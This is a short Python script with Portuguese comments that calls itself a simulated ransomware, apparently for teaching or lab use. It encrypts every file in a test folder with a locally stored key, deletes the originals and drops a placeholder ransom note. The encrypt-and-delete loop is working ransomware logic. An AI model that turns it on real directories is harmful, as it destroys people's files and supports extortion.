import os
from cryptography.fernet import Fernet

# 1. Define o diretório de teste
TARGET_DIR = "./target_files/"
EXTENSAO_CRIPTO = ".cripto"

# 2. Carrega a chave
with open("filekey.key", "rb") as filekey:
    key = filekey.read()

fernet = Fernet(key)

def encrypt_file(file_path):
    # Lê os dados
    with open(file_path, "rb") as file:
        file_data = file.read()
    
    # Criptografa os dados
    encrypted_data = fernet.encrypt(file_data)
    
    # Sobrescreve o arquivo com os dados criptografados e renomeia
    new_path = file_path + EXTENSAO_CRIPTO
    with open(new_path, "wb") as file:
        file.write(encrypted_data)
        
    os.remove(file_path) # Remove o arquivo original
    print(f"Criptografado: {file_path}")

# 3. Itera sobre os arquivos no diretório alvo
for filename in os.listdir(TARGET_DIR):
    file_path = os.path.join(TARGET_DIR, filename)
    
    # Ignora arquivos de sistema e arquivos já criptografados/a chave
    if os.path.isfile(file_path) and not filename.endswith(EXTENSAO_CRIPTO) and filename != "filekey.key":
        encrypt_file(file_path)

# 4. Gera a mensagem de resgate
with open(os.path.join(TARGET_DIR, "README_RESCUE.txt"), "w") as ransom_note:
    ransom_note.write("SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! Para a chave de descriptografia, insira aqui sua mensagem de resgate simulada.")

print("\nRansomware simulado concluído. Arquivos criptografados e nota de resgate deixada.")